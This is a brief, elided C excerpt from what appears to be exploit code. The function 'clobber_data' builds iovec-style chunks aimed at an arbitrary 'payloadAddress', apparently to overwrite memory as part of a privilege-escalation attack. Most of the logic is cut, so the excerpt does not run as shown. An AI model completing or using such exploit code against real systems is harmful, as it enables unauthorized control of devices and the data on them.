...
int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
{
	...
	unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS * 2];
	second_write_chunk[0]=(unsigned long)dummyBuffer;
	second_write_chunk[1]=SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10;
	second_write_chunk[2]=payloadAddress;
	second_write_chunk[3]=payloadLength;
	second_write_chunk[4]=(unsigned long)&testDatum;
	second_write_chunk[5]=sizeof(testDatum);
